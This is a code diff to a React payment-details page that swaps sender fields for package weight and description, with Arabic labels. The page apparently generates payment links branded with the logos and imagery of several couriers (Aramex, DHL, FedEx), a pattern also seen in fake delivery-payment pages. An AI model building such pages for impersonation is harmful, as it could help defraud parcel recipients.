@@ -5,7 +5,7 @@ import { Badge } from "@/components/ui/badge";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink } from "@/hooks/useSupabase";
-import { CreditCard, Shield, ArrowLeft, Hash, MapPin, DollarSign, User } from "lucide-react";
+import { CreditCard, Shield, ArrowLeft, Hash, MapPin, DollarSign, User, Package, Truck } from "lucide-react";
 import heroAramex from "@/assets/hero-aramex.jpg";
 import heroDhl from "@/assets/hero-dhl.jpg";
 import heroFedex from "@/assets/hero-fedex.jpg";
@@ -132,18 +132,18 @@ const PaymentDetails = () => {
                       <span className="font-semibold">{shippingInfo.tracking_number}</span>
                     </div>
                   )}
-                  {shippingInfo.sender_name && (
+                  {shippingInfo.package_weight && (
                     <div className="flex items-center gap-2">
-                      <User className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                      <span className="text-muted-foreground">المرسل:</span>
-                      <span className="font-semibold">{shippingInfo.sender_name}</span>
+                      <Package className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
+                      <span className="text-muted-foreground">وزن الطرد:</span>
+                      <span className="font-semibold">{shippingInfo.package_weight} كجم</span>
                     </div>
                   )}
-                  {shippingInfo.sender_city && (
+                  {shippingInfo.package_description && (
                     <div className="flex items-center gap-2">
-                      <MapPin className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
-                      <span className="text-muted-foreground">المدينة:</span>
-                      <span className="font-semibold">{shippingInfo.sender_city}</span>
+                      <Truck className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
+                      <span className="text-muted-foreground">وصف الطرد:</span>
+                      <span className="font-semibold">{shippingInfo.package_description}</span>
                     </div>
                   )}
                   {shippingInfo.cod_amount > 0 && (
